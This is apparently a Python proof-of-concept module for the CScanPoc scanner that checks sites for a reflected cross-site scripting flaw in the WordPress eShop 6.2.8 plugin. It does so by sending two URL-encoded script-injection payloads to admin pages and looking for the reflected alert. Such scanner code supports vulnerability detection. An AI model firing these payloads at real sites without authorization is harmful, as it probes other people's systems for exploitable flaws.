# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0056' # 平台漏洞编号，留空
    name = 'WordPress Plugin eShop 6.2.8跨站脚本攻击漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        WordPress Plugin eShop 6.2.8跨站脚本攻击漏洞
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36038/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'WordPress Plugin eShop'  # 漏洞应用名称
    product_version = '6.2.8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eb313a6d-e72a-4b72-8dd4-a5c2fe13b39e'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = ("wp-admin/admin.php?page=eshop-templates.php&eshoptemplate=%22%3E%3Cscript%3Ealert%28%2Fhello_topper%2f%29;%3C/script%3E",
                        "wp-admin/admin.php?page=eshop-orders.php&view=1&action=%22%3E%3Cscript%3Ealert%28%2Fhello_topper%2f%29;%3C/script%3E") 
            for payload in payloads:
                target_url = arg + payload
                code, head, res, errcode, _ = hh.http(target_url)
                       
                if code == 200 and res.find('alert(/hello_topper/)') != -1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()